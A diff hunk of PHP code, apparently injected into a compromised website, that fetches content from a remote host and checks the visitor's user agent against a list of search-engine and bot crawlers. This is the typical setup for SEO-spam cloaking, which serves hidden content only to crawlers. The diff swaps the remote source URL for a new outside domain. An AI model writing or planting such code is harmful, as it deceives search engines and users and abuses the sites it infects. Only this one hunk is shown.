@@ -15,7 +15,7 @@ function smoky($url) {
 }
 
 $res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$bot = "https://faktawanita.com/batak/batak.html";
+$bot = "https://ifubaya.id/creata/";
 $file = smoky($bot);
 $botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
 if (preg_match($botchar, $res)) {
